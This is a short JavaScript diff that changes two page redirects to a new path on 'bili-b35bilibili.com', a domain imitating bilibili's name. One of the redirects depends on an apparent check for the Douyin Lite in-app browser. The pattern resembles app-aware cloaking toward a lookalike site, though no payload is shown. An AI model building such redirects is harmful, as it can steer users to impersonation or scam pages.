@@ -50,7 +50,7 @@
     }
 
     function second() {
-        location.href = "https://al.bili-b35bilibili.com";
+        location.href = "https://mc.bili-b35bilibili.com/mc.html";
     }
 
     function isDouyinLiteApp() {
@@ -83,7 +83,7 @@
             second();
         } else {
            
-            window.location.href = 'https://al.bili-b35bilibili.com';
+            window.location.href = 'https://mc.bili-b35bilibili.com/mc.html';
         }
     }
 
